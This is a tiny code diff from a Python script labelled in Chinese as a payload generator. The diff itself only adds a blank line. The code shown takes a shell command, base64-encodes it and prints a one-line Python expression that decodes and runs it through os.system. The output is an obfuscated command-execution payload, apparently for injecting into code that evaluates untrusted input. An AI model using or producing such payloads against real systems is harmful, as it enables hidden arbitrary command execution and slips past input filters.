@@ -10,6 +10,7 @@ if False:
 
 #Payload生成
 import base64
+
 cmd = input('请输入命令: ')
 a = base64.b64encode(cmd.encode()).decode()
 print(f'''__import__('os').system(__import__('base64').b64decode('{a}').decode())''')
